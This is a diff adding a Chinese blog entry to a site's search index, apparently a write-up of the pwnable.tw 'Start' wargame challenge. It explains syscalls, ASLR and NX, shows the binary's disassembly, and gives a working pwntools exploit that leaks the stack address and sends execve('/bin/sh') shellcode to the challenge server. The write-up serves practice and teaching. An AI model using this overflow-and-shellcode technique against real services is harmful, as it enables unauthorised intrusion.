@@ -692,4 +692,33 @@ SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提�
         <category>pwn</category>
       </categories>
   </entry>
+  <entry>
+    <title>Pwnable.tw刷题记录</title>
+    <url>/undefined/pwnable.tw.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录pwnable.tw的刷题记录及知识点整理</p>
+<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul>
+<li><p><strong>改变栈指针的大小的同时会扩展/释放栈空间</strong></p>
+</li>
+<li><p>int 0x80是linux上的系统调用。</p>
+</li>
+<li><p>在int 0x80中，eax存放系统调用号，其余的几个寄存器存放参数。</p>
+</li>
+<li><p>ASLR只是不影响代码段和数据段的基址随机化，而我们布置的shellcode是在栈上，堆段和栈段是受系统ASLR影响的</p>
+</li>
+<li><p>怎么泄漏esp地址呢？在程序执行完ret后，要将程序劫持到0x08048087上，执行mov ecx,esp，然后通过输出，泄漏esp的地址</p>
+</li>
+<li><p>NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令</p>
+</li>
+<li><p>int n是执行中断程序的指令，n是中断类型码，这里的int 80h就相当于执行call指令。al = 4是write，al=3是read</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; <span class="built_in">len</span></span><br><span class="line">.text:0804808B                 mov     bl, <span class="number">1</span>           ; fd</span><br><span class="line">.text:0804808D                 mov     al, <span class="number">4</span></span><br><span class="line">.text:0804808F                 <span class="built_in">int</span>     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, <span class="number">3</span></span><br><span class="line">.text:08048097                 <span class="built_in">int</span>     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">leak=u32(p.recv(<span class="number">4</span>));</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line">shellcode= <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload= <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span> + p32(leak+<span class="number">20</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+  </entry>
 </search>
